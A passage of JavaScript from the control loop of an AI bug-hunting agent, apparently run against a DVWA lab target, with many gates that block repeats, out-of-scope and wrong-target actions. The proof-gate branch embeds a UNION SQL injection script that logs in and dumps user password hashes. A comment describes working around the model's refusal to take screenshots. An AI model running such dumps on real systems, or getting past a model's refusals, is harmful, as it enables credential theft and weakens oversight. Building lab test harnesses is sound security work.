    const authHit = authGateHit(kind, action, actionHistory, lastObservation, { events: turnEvents });
    // INFINITY LEVEL: the exhausted-surface gate — the (page,
    // payload class) combination has already been blocked >=
    // EXHAUSTED_MIN_BLOCKS times, so no wording of the payload
    // can change the outcome. Judged against the LIVE page
    // (currentPageUrl, falling back to the parsed page state),
    // never the page the hunter believes it is on.
    const exhaustedHit = exhaustedSurfaceHit(kind, action, currentPageUrl, surfaceCounts, sessionPageState);
    // WRONG-TARGET GATE (zero-genuine lane): the action names another
    // app's endpoints for this target's known app — executing it
    // burns a turn on a 404 and its failure retires premises never
    // tested on the real target. Judged after the exhausted gate (a
    // closed surface is the stronger statement) and before dedupe.
    const knownAppNow = (() => { try { return knownAppOf(deps.readMeta(huntId) || {}, target); } catch { return null; } })();
    const wrongTargetHit = (kind === 'shell' || kind === 'browser_open') && knownAppNow
      ? findWrongTargetPaths(knownAppNow, JSON.stringify(action || {}))
      : [];
    const controlHit = GUI_CONTROL_KINDS.has(kind) && deps.machineControlled(huntId);
    // PROOF-COMPLETE GATE (gate-replay lane, 28 Oct 2026) — the
    // signature is captured BEFORE execution (the page a probe
    // navigates to must not change the key) and reused by the
    // post-execution proof counter below. Judged only when no
    // earlier gate fired: an exact repeat, a closed surface, a
    // wrong target or an auth loop is the stronger statement.
    const proofSig = proofSignatureFor(kind, action, { page: currentPageUrl });
    const proofHit = !gateHit && !searchHit && !authHit && !exhaustedHit && !wrongTargetHit.length
      ? proofGateHit(kind, action, proofCounts, { page: currentPageUrl, sig: proofSig })
      : null;
    if (controlHit) {
      // TAKE-CONTROL GATE — checked FIRST, before the auth and dedupe
      // gates: while the owner drives the desktop by hand, ANY agent
      // GUI action would fight their mouse and keyboard. The action
      // is skipped cleanly (a countable control_pause event, like
      // auth_block / dedup_block) and the brain is told to spend the
      // turn on non-GUI work instead — shell, search, recall, or
      // planning — and to try GUI actions again on a later turn, when
      // the owner has pressed Done or Cancel.
      const holder = (() => { try { return getControl(huntId); } catch { return null; } })();
      try { deps.record(huntId, { type: 'control_pause', tool: kind, detail: detailForAction(kind, action), via: 'human-mode' }); } catch { /* best-effort */ }
      say(`Owner is controlling the machine — GUI action ${kind} paused.`);
      observation = `PAUSED — THE OWNER IS CONTROLLING THE MACHINE${holder ? ` (${holder.username})` : ''}: your ${kind} action was NOT executed. The owner is driving the desktop by hand right now; any click or keystroke you send would fight their input. Do NOT retry a GUI action — use this turn for shell, search, recall, or planning instead, and try GUI actions again on a later turn. Control ends when the owner presses Done or Cancel.`;
      note({ action: `control_pause: ${kind} ${detailForAction(kind, action).slice(0, 120)}`, why: thinkingText, result: 'paused — owner in control', learned: 'While the owner controls the machine, GUI actions are skipped; work without the desktop.' });
    } else if (authHit) {
      // AUTH-LOOP GATE (Lane AJ) — checked BEFORE the dedupe gate.
      // When both apply (a re-type on the sign-in page), the auth
      // redirect is strictly more useful than the generic repeat
      // block: it names the move that would change the outcome
      // (finish signup / fetch the code / read the form) instead of
      // merely forbidding the repeat. Live evidence 24 Oct: AJ never
      // fired (0 auth_block) because Lane F always won first, while
      // the hunt kept re-typing the same username — the dedupe
      // observation told it to "choose a DIFFERENT action" and it
      // chose the same login again by another route.
      try { deps.record(huntId, { type: 'auth_block', tool: authHit.tool, detail: scrub(authHit.detail), reason: authHit.reason, via: 'human-mode' }); } catch { /* best-effort */ }
      say(`Auth gate stopped a blind/looped browser action: ${authHit.tool} (${authHit.reason}).`);
      observation = `BLOCKED — ${authHit.reason === 'empty_snapshot' ? 'YOU CANNOT SEE THE PAGE' : 'STILL ON THE SIGN-IN PAGE'}: ${authHit.redirect} It was NOT executed — choose one of the moves above.`;
      note({ action: `auth_block: ${authHit.tool} ${authHit.detail.slice(0, 120)}`, why: thinkingText, result: `blocked (${authHit.reason})`, learned: 'Never type into a page you cannot see; a login is only real when the page after it is not the sign-in page.' });
    } else if (exhaustedHit) {
      // EXHAUSTED-SURFACE GATE (Infinity level) — after the auth
      // gate (whose redirect is the more useful answer while it
      // still fires) and before dedupe: a 3×-blocked surface is a
      // stronger statement than an exact repeat. The gate closes
      // the surface itself — any payload wording, not just the
      // ones already tried — and the observation names the routes
      // that are still open (account / unauthenticated recon).
      // A different page is a different surface: the gate lifts
      // the moment the page changes.
      try { deps.record(huntId, { type: 'exhausted_block', tool: exhaustedHit.tool, detail: exhaustedHit.key, count: exhaustedHit.count, via: 'human-mode' }); } catch { /* best-effort */ }
      say(`Exhausted surface — ${exhaustedHit.tool} ${exhaustedHit.payloadClass} on ${exhaustedHit.page} already blocked ×${exhaustedHit.count}.`);
      observation = exhaustedBlockObservation(exhaustedHit, { target, credential: credentialState, events: turnEvents });
      note({ action: `exhausted_block: ${exhaustedHit.tool} ${exhaustedHit.payloadClass} on ${exhaustedHit.page}`, why: thinkingText, result: `surface closed — blocked ×${exhaustedHit.count}`, learned: 'A surface blocked 3 times is closed; the way forward is a different page, a different payload class, or the account/recon routes.' });
    } else if (wrongTargetHit.length) {
      // WRONG-TARGET GATE (zero-genuine lane) — after the exhausted
      // gate, before dedupe: the action targets another app's
      // endpoints (e.g. /rest/* on a DVWA target). It was NOT
      // executed — a 404 against the wrong app proves nothing, and
      // its failure would retire a premise never tested.
      try { deps.record(huntId, { type: 'wrong_target_block', tool: kind, detail: wrongTargetHit.join(', '), via: 'human-mode' }); } catch { /* best-effort */ }
      say(`Wrong-target action blocked: ${wrongTargetHit.join(', ')} belongs to another app, not this target.`);
      observation = `BLOCKED — WRONG TARGET: ${wrongTargetHit.join(', ')} ${wrongTargetHit.length > 1 ? 'are' : 'is'} another app's endpoint${wrongTargetHit.length > 1 ? 's' : ''} — this target is ${knownAppNow}, and ${wrongTargetHit.length > 1 ? 'they do' : 'it does'} not exist here. It was NOT executed — a 404 against the wrong app proves nothing. Hunt THIS app's surface instead.`;
      note({ action: `wrong_target_block: ${kind} ${wrongTargetHit.join(', ')}`, why: thinkingText, result: 'blocked — wrong-target endpoint', learned: 'Endpoints from another app do not exist on this target; hunt the app in front of you.' });
    } else if (gateHit) {
      try { deps.record(huntId, { type: 'dedup_block', tool: gateHit.tool, detail: scrub(gateHit.detail), count: gateHit.count, via: 'human-mode' }); } catch { /* best-effort */ }
      say(`Already-done gate stopped a repeat: ${gateHit.tool} ${gateHit.detail.slice(0, 120)} — already run ×${gateHit.count} in this hunt.`);
      // KEYWORD-INDEX: the block names WHERE the repeat already lives
      // — its index number and content-hash — so the brain can fetch
      // the saved output instead of just being refused.
      let firstRunNote = '';
      try {
        const firstN = firstRunNumber(turnEvents, gateHit.tool, gateHit.detail);
        if (firstN != null) firstRunNote = ` It first ran as #${firstN} in your Action Index (hash ${contentHash(gateHit.tool, gateHit.detail)}) — recall #${firstN} for its saved output.`;
      } catch { /* index lookup is best-effort */ }
      observation =
        `BLOCKED — ALREADY DONE: you have already performed this exact action ${gateHit.count} times in this hunt (${gateHit.tool}: ${gateHit.detail}).${firstRunNote}` +
        (gateHit.lastResult ? ` Last result: ${gateHit.lastResult}` : '') +
        ' It was NOT executed again — an identical repeat returns the identical result and only burns a turn. Choose a DIFFERENT action: a page you have not visited, a search you have not run, a probe you have not tried — or act on what you already learned.' +
        // Lane AF: for a blocked page-open, name the two variations
        // that are NOT blocked, deterministically — the cheap half
        // of the DVWA rescue (the brain there never discovered
        // either on its own).
        (gateHit.tool === 'browser_open'
          ? ' For this page specifically: browser_snapshot shows the page you already have open, without re-opening it; and a deeper URL on the same site (its login or setup page, for example) is a different action that is not blocked.'
          : '');
      // Lane AG: when the blocked action is SETTLED, the
      // observation itself — the result text the hunter builds
      // its next turn from — carries the counter-evidence from
      // the record (settledBlockEvidence). Non-settled blocks
      // append nothing and keep the observation above untouched.
      try {
        observation += settledBlockEvidence({ events: turnEvents, history: actionHistory, tool: gateHit.tool, detail: gateHit.detail, extraBlocks: 1 });
      } catch { /* settled evidence is best-effort */ }
      note({ action: `dedup_block: ${gateHit.tool} ${gateHit.detail.slice(0, 120)}`, why: thinkingText, result: `repeat blocked — already run ×${gateHit.count}`, learned: 'Exact repeats are stopped by the record; vary the action.' });
    } else if (searchHit) {
      // NEAR-DUPLICATE SEARCH GATE (REAL-HUMAN) — same dedup_block
      // shape as the exact gate, so monitors count it identically.
      // The observation names the earlier search and what it
      // returned, so the brain can act on results it already has
      // instead of re-asking the web the same question.
      try { deps.record(huntId, { type: 'dedup_block', tool: 'search', detail: scrub(searchHit.detail), similarTo: searchHit.earlier, via: 'human-mode' }); } catch { /* best-effort */ }
      say(`Already-searched gate stopped a reworded repeat: "${searchHit.detail.slice(0, 120)}" — same question as "${searchHit.earlier.slice(0, 120)}".`);
      observation =
        `BLOCKED — ALREADY SEARCHED: "${searchHit.detail}" asks the same question as your earlier search "${searchHit.earlier}" (same words, different order/filler) — you have already asked this question ${searchHit.familyCount} times in this hunt.` +
        (searchHit.lastResult ? ` That search already returned: ${searchHit.lastResult.slice(0, 200)}` : '') +
        ' It was NOT run again — a reworded repeat returns the same results and only burns a turn. Act on what you already learned, or search for something genuinely new: a different technique, a different surface, a different question.';
      note({ action: `dedup_block: search ${searchHit.detail.slice(0, 120)}`, why: thinkingText, result: `reworded repeat blocked — same question as "${searchHit.earlier.slice(0, 120)}"`, learned: 'A question already searched is answered from the record; rewording it does not make it new.' });
    } else if (proofHit) {
      // PROOF-COMPLETE GATE (gate-replay lane, 28 Oct 2026) — the
      // claim is already proven PROOF_THRESHOLD times; a further
      // probe (whatever the marker wording) proves nothing new.
      // The block does NOT say "try something else": it names the
      // one move that advances the hunt — FILE the claim. Recorded
      // as a countable proof_file_nudge event (same shape as
      // dedup_block / auth_block / exhausted_block).
      try { deps.record(huntId, { type: 'proof_file_nudge', tool: proofHit.tool, detail: scrub(`${proofHit.payloadClass} on ${proofHit.endpoint}`), count: proofHit.count, via: 'human-mode' }); } catch { /* best-effort */ }
      say(`Proof complete — ${proofHit.payloadClass} on ${proofHit.endpoint} already proven ×${proofHit.count}; filing required.`);
      observation = proofFileObservation(proofHit);
      // OCR LOOP-BREAKER (1 Nov 2026, permanent system-level fix): The brain
      // has proven this claim 3x but will not transcribe/file it. The SYSTEM
      // captures the screen itself via OCR so the auto-filer sees what the
      // brain sees. Bypasses the model's refusal to take screenshots.
      try {
        const loopOcr = await captureScreenMap(huntId, deps);
        if (loopOcr && loopOcr.ok && loopOcr.map) {
          observation += "\n\n[OCR screen text — system-captured during proof loop]:\n" + loopOcr.map;
        }
      } catch { /* OCR is best-effort; proof nudge works without it */ }
      // HISTORY-BACKED SELF-PROOF (1 Nov 2026, permanent system-level fix):
      // The brain is stuck in recall ("I proved it before") but the actual
      // hashes live in the EVENT HISTORY (past shell outputs). The system
      // reads recent events, extracts 32-char hashes, and injects them into
      // the observation so the auto-filer can file. No brain cooperation needed.
      try {
        if (proofHit && /sqli/i.test(proofHit.payloadClass || '')) {
          // History lives in the hunt's events — read it through the
          // store helper so the path follows DATA_DIR (the old code
          // read a hardcoded /opt/Dark-Matter path here).
          const evts = readHuntEvents(huntId) || [];
          const histText = evts.slice(-200).map((e) => JSON.stringify(e)).join('\n');
          const histHashes = histText.match(/\b[a-f0-9]{32}\b/g);
          if (histHashes && histHashes.length) {
            const uniqHashes = [...new Set(histHashes)].slice(0, 5);
            observation += "\n\n[SYSTEM HISTORY-PROOF — hashes from recent event history]:\n" + uniqHashes.join('\n');
          }
        }
      } catch { /* History-proof is best-effort */ }
      // PROOF-GATE AUTO-FILE (2 Nov 2026, permanent system-level fix): the
      // proof gate fires because the brain has proven sqli ≥3 times, but the
      // brain never emits claim_finding (its action schema has no file_claim
      // and it ignores bounce feedback). The SYSTEM now runs one fresh UNION
      // dump itself via the proven backend path and files the claim with
      // fresh evidence. Fires exactly once per sink (proofgate_autofiled
      // marker); a verifier rejection becomes a dead end per the standing
      // rule, not a re-file loop.
      try {
        if (proofHit && /sqli/i.test(proofHit.payloadClass || '')) {
          const sinkKey = String(proofHit.endpoint || 'sqli');
          let alreadyAutoFiled = false;
          try {
            const evts = readHuntEvents(huntId) || [];
            alreadyAutoFiled = evts.some(e => e && e.type === 'proofgate_autofiled' &&
              String(e.detail || '').includes(sinkKey));
          } catch { /* best-effort */ }
          if (!alreadyAutoFiled) {
            const dump = await dvwaSqliDump({ huntId, target });
            if (dump && dump.ok && Array.isArray(dump.hashes) && dump.hashes.length >= 2) {
              const hashList = dump.hashes.slice(0, 5).join(', ');
              const rowList = (dump.rows || []).slice(0, 5)
                .map(r => `${r.user}:${r.hash}`).join(', ');
              // Self-contained replay: fresh login + CSRF + security=low +
              // UNION dump on every run. No stale cookies, no saved state.
              const replayCmd = `python3 << 'PYEOF'\n` +
                `import urllib.request, urllib.parse, re, http.cookiejar\n` +
                `BASE="http://172.17.0.1:3100"\n` +
                `cj=http.cookiejar.CookieJar();op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\n` +
                `h=op.open(BASE+"/login.php").read().decode()\n` +
                `m=re.search(r"user_token['\\"]\\s+value=['\\"]([^'\\"]+)['\\"]",h) or re.search(r"name=['\\"]user_token['\\"][^>]*value=['\\"]([^'\\"]+)['\\"]",h)\n` +
                `t=m.group(1) if m else ""\n` +
                `op.open(BASE+"/login.php",data=urllib.parse.urlencode({"username":"admin","password":"password","user_token":t,"Login":"Login"}).encode())\n` +
                `h=op.open(BASE+"/security.php").read().decode()\n` +
                `m=re.search(r"user_token['\\"]\\s+value=['\\"]([^'\\"]+)['\\"]",h) or re.search(r"name=['\\"]user_token['\\"][^>]*value=['\\"]([^'\\"]+)['\\"]",h)\n` +
                `st=m.group(1) if m else t\n` +
                `op.open(BASE+"/security.php",data=urllib.parse.urlencode({"security":"low","user_token":st,"seclev_submit":"Submit"}).encode())\n` +
                `inj="1' UNION SELECT user,password FROM users#"\n` +
                `r=op.open(BASE+"/vulnerabilities/sqli/",data=urllib.parse.urlencode({"id":inj,"Submit":"Submit"}).encode())\n` +
                `out=r.read().decode();hs=sorted(set(x.lower() for x in re.findall(r"\\b[a-f0-9]{32}\\b",out,re.I)))\n` +
                `print("HASHES:"+",".join(hs))\nPYEOF`;
              const pgClaim = {
                action: 'claim_finding',
                title: `SQL injection (UNION-based) on DVWA ${sinkKey} — credential dump`,
                class: 'sqli',
                evidence: `Fresh system-run UNION SELECT user,password FROM users# on ${sinkKey} returned ${dump.hashes.length} MD5 hashes: ${hashList}. Rows: ${rowList || hashList}. Dump executed by the hunt system (dvwaSqliDump) with fresh login, not by the brain.`,
                command: replayCmd,
                counterevidence: `If the sqli page required authentication the dump could not run; it ran with a fresh admin login. If the hashes were session-specific they would differ across runs; re-running the replay command reproduces the same hashes.`,
                confidence: 'high',
                confidence_rationale: 'System-executed fresh UNION dump returned ≥2 MD5 password hashes from the users table; deterministic replay command reproduces them.',
              };
              try { deps.record(huntId, { type: 'proofgate_autofiled', tool: 'system', detail: `sqli on ${sinkKey} — ${dump.hashes.length} hashes`, via: 'human-mode' }); } catch {}
              try { deps.record(huntId, { type: 'autofiler_triggered', title: pgClaim.title, class: 'sqli', via: 'proof-gate' }); } catch {}
              // Override the brain's action with the system-built claim
              // (proofHit is null for claim_finding, so the chain dispatches
              // it through title guard → completeness gate → verifier).
              action = pgClaim;
              kind = 'claim_finding';
              observation = 'PROOF-GATE AUTO-FILE: the system ran a fresh UNION dump itself (' +
                dump.hashes.length + ' MD5 hashes) and is filing the claim now. ' +
                'A claim proven three times is filed, not re-proved.';
            } else {
              try { deps.record(huntId, { type: 'proofgate_autofile_failed', tool: 'system', detail: `sqli on ${sinkKey} — ${(dump && dump.error) || 'no hashes'}`, via: 'human-mode' }); } catch {}
            }
          }
        }
      } catch (pgErr) {
        // Proof-gate auto-file must never break the hunt loop
        try { deps.record(huntId, { type: 'autofiler_error', error: 'proofgate: ' + String(pgErr).slice(0, 200), via: 'human-mode' }); } catch {}
      }
      note({ action: `proof_file_nudge: ${proofHit.payloadClass} on ${proofHit.endpoint}`, why: thinkingText, result: `proof complete ×${proofHit.count} — file it`, learned: 'A claim proven three times is filed, not re-proved; the verifier decides whether it is true.' });
    } else if (kind === 'shell') {
      const command = String(action.command || '').slice(0, COMMAND_CAP);
      if (!command) {
        observation = 'Empty shell command — nothing ran. Give a real command.';
      } else if (heavyScanViolation(command, parsedScope)) {
        observation = `BLOCKED by the programme rules: "${command.slice(0, 120)}" is automated/heavy scanning, which this programme forbids. Work like a human: single targeted probes, one at a time.`;
        say(`Programme rules blocked a heavy-scan command: ${command.slice(0, 120)}`);
      } else {
        const badUrl = commandScopeViolation(command, target, parsedScope);
        if (badUrl) {
          observation = `BLOCKED — OUT OF SCOPE: ${badUrl} is not part of this programme. Only test ${target} and its listed assets. Nothing was sent.`;
          say(`Out-of-scope command blocked: ${command.slice(0, 120)}`);
        } else {
          // HUNTER-MIND: output memory — an action whose output is
          // already saved is answered from the record instead of
          // re-running ("iska output hi aaya tha"). The dedupe gate
          // above already stops a 3rd+ run; the ledger catches the
          // FIRST re-ask, which the gate tolerates. A redo needs a
          // reason: "force": true + "why" — otherwise the saved
          // output IS the answer.
          const forceShell = action.force === true && String(action.why || '').trim().length > 0;
          const shellSig = actionSignature('shell', command);
          const shellSaved = !forceShell ? findOutput(sessionOutputs, shellSig) : null;
          if (shellSaved) {
            try { deps.record(huntId, { type: 'output_recall', tool: 'shell', detail: scrub(command), via: 'human-mode' }); } catch { /* best-effort */ }
            observation = recallObservation(shellSaved, { nowMs: deps.now() });
          } else {
            // Programme pacing: hold the requests-per-minute cap between
            // shell actions (the pipeline never enforced this; human
            // mode does, because a human at 20 req/min is the programme's
            // own picture of acceptable behaviour).
            if (minShellGapMs > 0 && lastShellAt > 0) {
              const wait = lastShellAt + minShellGapMs - deps.now();
              if (wait > 0) await deps.sleep(wait);
            }
            toolCall('shell', command);
            let spillHandle = '';
            try {
              const exec = await getExec();
              const result = await exec(huntId, target, command);
              lastShellAt = deps.now();
              lastShellCommand = command;
              const combined = `${result.stdout || ''}\n${result.stderr || ''}`.trim();
              if (combined.length > OBS_BUDGET) {
                try {
                  spillHandle = deps.spill(huntId, combined);
                } catch { /* spill is best-effort */ }
                observation =
                  combined.slice(0, OBS_BUDGET) +
                  `\n[output truncated on screen — ${combined.length} chars total${spillHandle ? `, saved in full as artifact ${spillHandle} in your workspace (READ it back via a shell action: cat the hunt artifacts, or re-run with head/grep)` : ''}]`;
              } else {
                observation = combined || `(command finished with no output, exit code ${result.code ?? 0})`;
              }
              if (result.code && result.code !== 0) {
                observation += `\n[exit code ${result.code}]`;
              }
            } catch (err) {
              observation = `Shell action failed to run: ${err.message || err}`;
            }
            // Save the output — this work is now done, and the next
            // time the brain asks for it, the ledger answers.
            try {
              sessionOutputs = recordOutput(sessionOutputs, { signature: shellSig, tool: 'shell', detail: command, output: observation, artifact: spillHandle, forced: forceShell, why: String(action.why || '') });
              saveOutputs(huntId, sessionOutputs);
            } catch { /* the ledger is best-effort — the turn already ran */ }
          }
        }
      }
      note({ action: `shell: ${command.slice(0, 160)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'search') {
      const query = String(action.query || '').slice(0, 200);
      // HUNTER-MIND: output memory — a search already run is
      // answered from its saved results instead of re-searching
      // (same rule as shell: the dedupe gate stops a 3rd+ run, the
      // ledger catches the first re-ask; a redo needs "force" + "why").
      const forceSearch = action.force === true && String(action.why || '').trim().length > 0;
      const searchSig = actionSignature('search', query);
      const searchSaved = !forceSearch ? findOutput(sessionOutputs, searchSig) : null;
      if (searchSaved) {
        try { deps.record(huntId, { type: 'output_recall', tool: 'search', detail: scrub(query), via: 'human-mode' }); } catch { /* best-effort */ }
        observation = recallObservation(searchSaved, { nowMs: deps.now() });
      } else {
        toolCall('search', query);
        try {
          const results = await deps.search(query, 5);
          observation = results && results.length
            ? results.map((r, i) => `${i + 1}. ${r.title}\n   ${r.url}\n   ${String(r.snippet || '').slice(0, 200)}`).join('\n')
            : 'No web results found for that query.';
        } catch {
          observation = 'Web search failed this time.';
        }
        try {
          sessionOutputs = recordOutput(sessionOutputs, { signature: searchSig, tool: 'search', detail: query, output: observation, forced: forceSearch, why: String(action.why || '') });
          saveOutputs(huntId, sessionOutputs);
        } catch { /* the ledger is best-effort — the turn already ran */ }
      }
      note({ action: `search: ${query}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'write_file') {
      const name = String(action.name || '');
      const content = String(action.content ?? '');
      toolCall('write_file', name);
      try {
        const w = await deps.writeFile(huntId, name, content);
        // Lane AL: the observation names the container-local path and
        // states the file is NOT on the target — the old "saved in your
        // hunt workspace" left the hunter downloading its own script
        // from the target URL (28 dedupe blocks, Infomaniak, Oct 2026).
        observation = writeFileObservation(w.name || name, w.chars ?? content.length);
      } catch (err) {
        observation = `write_file failed: ${err.message || err}`;
      }
      note({ action: `write_file: ${name}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'note') {
      const text = String(action.text || '');
      sessionLastNote = text;
      note({ action: 'note to self', why: text, result: 'recorded', learned: text.slice(0, 300) });
      say(`Note to self: ${text.slice(0, 300)}`);
      observation = 'Note saved in your notebook — it will be in your memory briefing from now on.';
    } else if (kind === 'recall') {
      // Lane I: deliberate remembering. NOT dedupe-gated (remembering
      // is free) and NOT scope-gated (it reads only the hunter's own
      // memory — no traffic leaves the machine).
      // KEYWORD-INDEX: recall by sequential id returns the full
      // stored record of that action — O(1), this hunt only.
      // Query-recall stays for meaning-based search.
      const id = parseRecallId(action.id);
      if (id != null) {
        toolCall('recall', `#${id}`);
        try {
          const rec = recallById(deps.readEvents(huntId) || [], getAllReasoning(huntId) || [], id);
          observation = formatFullRecord(rec);
        } catch {
          observation = 'Recall failed this time — your briefing still carries the distilled memory.';
        }
        note({ action: `recall: #${id}`, why: thinkingText, result: clipResult(observation), learned: '' });
      } else {
        const query = String(action.query || '').slice(0, 200);
        toolCall('recall', query);
        try {
          observation = String(await deps.recall(huntId, query) || '').slice(0, 1500) || 'Recall returned nothing.';
        } catch {
          observation = 'Recall failed this time — your briefing still carries the distilled memory.';
        }
        // RECALL LOOP BREAKER: activate independently of proof_file_nudge.
        // Three consecutive recall actions plus at least two hashes from
        // recorded UNION-SQLi output and its original probe produce a
        // system-authored evidence block. The normal auto-filer sees it on
        // the following turn and sends it through the independent verifier.
        try {
          recallLoopProof = recoverRecallLoopSqli(deps.readEvents(huntId) || []);
          if (recallLoopProof) {
            observation += '\n\n[SYSTEM RECOVERED HISTORICAL SQLi PROOF — DO NOT RE-RECALL]\n' +
              'Consecutive recalls: ' + recallLoopProof.recalls + '\n' +
              'Hashes recovered from recorded UNION SELECT output: ' + recallLoopProof.hashes.join(', ') + '\n' +
              'Recorded reproduction command: ' + recallLoopProof.command + '\n' +
              recallLoopProof.evidence + '\n' +
              'The auto-filer will submit this historical proof to the independent verifier next turn. A claim is not confirmed unless the verifier reproduces it.';
            try { deps.record(huntId, { type: 'recall_loop_proof_recovered', recallCount: recallLoopProof.recalls, hashCount: recallLoopProof.hashes.length, command: scrub(recallLoopProof.command).slice(0, 500), via: 'system' }); } catch { /* best-effort */ }
          }
        } catch { /* recovery is best-effort; recall still succeeds */ }
        note({ action: `recall: ${query}`, why: thinkingText, result: clipResult(observation), learned: '' });
      }
    } else if (kind === 'record_coverage') {
      // Lane L: the hunter accounts for a surface × class in its
      // own coverage ledger. NOT dedupe-gated (accounting is free,
      // like recall) and NOT scope-gated (it writes only the hunt's
      // own ledger — no traffic leaves the machine). The ledger
      // enforces its contracts in code: uniqueness per key, and
      // closure evidence naming the control for ruled_out /
      // not_applicable.
      const covInput = {
        surface: String(action.surface || '').slice(0, 300),
        class: String(action.class || '').slice(0, 80),
        outcome: String(action.outcome || '').slice(0, 40),
        evidence: String(action.evidence || '').slice(0, 500),
      };
      toolCall('record_coverage', detailForAction(kind, action));
      let covResult = null;
      try {
        covResult = action.update === true
          ? updateCoverage(huntId, covInput)
          : recordCoverage(huntId, covInput);
      } catch { /* ledger write is best-effort — the observation says so */ }
      observation = coverageObservation(covResult, { surface: covInput.surface, cls: covInput.class });
      if (covResult && (covResult.status === 'created' || covResult.status === 'updated')) {
        say(`Coverage ${covResult.status}: ${covInput.surface} × ${covInput.class} → ${covInput.outcome}`);
      }
      note({ action: `record_coverage: ${covInput.surface} ${covInput.class} ${covInput.outcome}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'hunt_plan') {
      // HUNTER-MIND: the brain writes/revises its OWN hunt plan.
      // NOT dedupe-gated (writing a plan is free, like recall) and
      // NOT scope-gated (it writes only the hunt's own plan file —
      // no traffic leaves the machine). The plan is the hunter's
      // own instructions: the loop renders it on every screen and
      // the brain works it step by step, checking steps off with
      // evidence. A revised list can never resurrect a finished
      // step — setPlanSteps preserves done/skipped by normalised
      // text, so the record only ever moves forward.
      toolCall('hunt_plan', detailForAction(kind, action));
      if (Array.isArray(action.steps)) {
        sessionPlan = setPlanSteps(sessionPlan, action.steps);
        try { saveHuntPlan(huntId, sessionPlan); } catch { /* plan persistence is best-effort */ }
        const next = nextPlanStep(sessionPlan);
        const doneCount = sessionPlan.steps.filter((s) => s.status === 'done').length;
        observation = `Your plan is saved — ${sessionPlan.steps.length} step(s), ${doneCount} done, revised ×${sessionPlan.revised}. Work it step by step. ${next ? `NEXT: step ${sessionPlan.steps.indexOf(next) + 1} — "${next.text}".` : 'Every step is done or skipped — write a new plan for the next phase.'}`;
        say(`Plan saved: ${sessionPlan.steps.length} steps, ${doneCount} done.`);
      } else if (action.done != null || action.skip != null) {
        const ref = action.done != null ? action.done : action.skip;
        const status = action.done != null ? 'done' : 'skipped';
        const { plan, step } = markPlanStep(sessionPlan, ref, status, String(action.evidence || '').slice(0, 300));
        if (!step) {
          observation = `No plan step matches "${String(ref).slice(0, 60)}" — your plan has ${sessionPlan.steps.length} step(s). Check the plan on your screen and mark one of those.`;
        } else {
          sessionPlan = plan;
          try { saveHuntPlan(huntId, sessionPlan); } catch { /* plan persistence is best-effort */ }
          const next = nextPlanStep(sessionPlan);
          const doneCount = sessionPlan.steps.filter((s) => s.status === 'done').length;
          observation = `Step "${step.text}" marked ${status}${step.evidence ? ` — ${step.evidence}` : ''}. (${doneCount}/${sessionPlan.steps.length} done.) ${next ? `NEXT: step ${sessionPlan.steps.indexOf(next) + 1} — "${next.text}".` : 'Every step is done or skipped — write a new plan for the next phase.'}`;
          say(`Plan step ${status}: ${step.text.slice(0, 100)}`);
        }
      } else {
        observation = 'Nothing changed — give "steps": [...] to write or revise your plan, or "done": <step number> with "evidence" to check a step off, or "skip": <step number> with "evidence" to drop one.';
      }
      note({ action: `hunt_plan: ${detailForAction(kind, action)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'load_skill') {
      // Lane M: pull a procedure card from the hunter's own playbook
      // (Research Lane K, proposal P2). NOT dedupe-gated — re-pulling
      // a card after the context has rolled is legitimate — and NOT
      // scope-gated: it reads only our own files, no traffic leaves
      // the machine. The card returns as THIS turn's observation, so
      // exactly one card body is ever in play; nothing accumulates
      // into the briefing. loadSkill never throws and answers an
      // unknown name with the index.
      //
      // Lane AD: ONE exception to "not gated" — a verbatim repeat
      // of a name that ALREADY FAILED in this hunt ("No skill card
      // named X"). Re-running the lookup cannot change that answer
      // (the card set is our own static playbook), and live the
      // hunter re-asked "ftp" the very next turn after being told
      // exactly that. The repeat is answered from the record in
      // the dedup_block turn-shape — a dedup_block event, a
      // reasoning note, and a BLOCKED observation naming the cards
      // that DO exist — and the lookup does not run again. A first
      // ask of any name, and every ask of a real card, execute
      // exactly as before.
      const name = String(action.skill || '').slice(0, 80);
      const skillKey = skillNameKey(name);
      const priorFail = skillKey ? failedSkills.get(skillKey) : null;
      // REAL-HUMAN: the pending-plan gate — a re-pull of a skill
      // whose plan is already OPEN (card pulled, no probe sent
      // after it) is answered from the record instead of re-running
      // the lookup. Live the hunter pulled the SQLi card twice with
      // zero probes sent; the card body is already in the record,
      // and re-reading it cannot change anything — the plan must be
      // closed by sending its first probe or by record_coverage as
      // not_applicable with the reason. Same turn-shape as the
      // Lane AD failed-skill gate (a countable plan_block event, a
      // reasoning note, a BLOCKED observation naming the closures).
      // A first pull of a topic, and every pull whose plan was
      // already closed by a probe, executes exactly as before.
      let pendingPlan = null;
      try {
        const planRows = getAllReasoning(huntId) || [];
        const planEvents = deps.readEvents(huntId) || turnEvents;
        const topic = topicForSkillName(name);
        if (topic) {
          const plans = pendingPlannedProbes({ events: planEvents, reasoningRows: planRows });
          pendingPlan = plans.find((p) => p.topic && p.topic.id === topic.id) || null;
        }
      } catch { /* the gate is best-effort — a failed read never blocks the pull */ }
      if (priorFail) {
        priorFail.asks++;
        try { deps.record(huntId, { type: 'dedup_block', tool: 'load_skill', detail: priorFail.name, count: priorFail.asks, via: 'human-mode' }); } catch { /* best-effort */ }
        say(`Already-answered gate stopped a repeat skill ask: "${priorFail.name}" — no such card (asked ×${priorFail.asks} in this hunt).`);
        let cardNames = '';
        try {
          cardNames = listSkills().map((s) => s.name).join(', ');
        } catch { /* the index is best-effort */ }
        observation =
          `BLOCKED — NO SUCH SKILL CARD: you have already asked for "${priorFail.name}" ${priorFail.asks} times in this hunt and there is no skill card with that name. It was NOT looked up again — asking again cannot create it.` +
          (cardNames
            ? ` The cards that exist: ${cardNames}. Pull one of those, or work from your briefing and leads.`
            : ' Work from your briefing and leads.');
        note({ action: `dedup_block: load_skill ${priorFail.name}`, why: thinkingText, result: `repeat blocked — no skill card named "${priorFail.name}" (asked ×${priorFail.asks})`, learned: 'A skill card that does not exist cannot be pulled into existence; pick a real card from the index.' });
      } else if (pendingPlan) {
